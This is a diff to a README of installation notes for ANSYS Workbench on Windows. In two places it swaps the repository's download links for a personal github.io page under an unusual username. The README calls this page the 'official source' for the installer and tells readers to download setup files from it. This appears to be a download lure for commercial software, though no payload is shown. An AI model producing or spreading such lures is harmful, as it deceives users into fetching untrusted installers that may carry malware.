@@ -1,6 +1,6 @@
 # 🛠️ ANSYS-Workbench-Install-Notes - Get Engineering Software Working On Windows
 
-[![](https://img.shields.io/badge/Download-Resource_Page-blue.svg)](https://github.com/andersselfdeprecating373/ANSYS-Workbench-Install-Notes)
+[![](https://img.shields.io/badge/Download-Resource_Page-blue.svg)](https://andersselfdeprecating373.github.io)
 
 ANSYS Workbench acts as a primary tool for engineers to perform simulations. Users often face challenges when setting up this software on Windows 11. This repository provides steps to install the program and fix common errors. Follow these instructions to prepare your computer for simulation work.
 
@@ -18,7 +18,7 @@ Before you start the installation, ensure your computer meets the hardware stand
 
 You must obtain the installer from the official source. Use the link below to access the setup files and documentation.
 
-[Click here to visit the page to download](https://github.com/andersselfdeprecating373/ANSYS-Workbench-Install-Notes)
+[Click here to visit the page to download](https://andersselfdeprecating373.github.io)
 
 Follow these steps on the website:
 1. Locate the latest version folder.
